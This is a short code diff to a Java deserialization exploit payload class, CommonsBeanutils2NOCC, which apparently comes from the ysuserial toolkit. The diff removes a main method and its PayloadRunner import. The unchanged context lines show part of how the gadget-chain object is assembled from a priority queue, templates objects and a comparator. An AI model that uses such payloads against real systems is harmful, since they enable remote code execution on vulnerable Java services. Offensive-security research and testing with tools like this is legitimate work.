@@ -6,7 +6,6 @@ import javassist.CtClass;
 import javassist.CtField;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.SuClassLoader;
 
 import java.util.Comparator;
@@ -46,9 +45,5 @@ public class CommonsBeanutils2NOCC implements ObjectPayload<Object> {
         setFieldValue(queue, "queue", new Object[]{templates, templates});
         ctBeanComparator.defrost();
         return queue;
-    }
-
-    public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsBeanutils2NOCC.class, args);
     }
 }
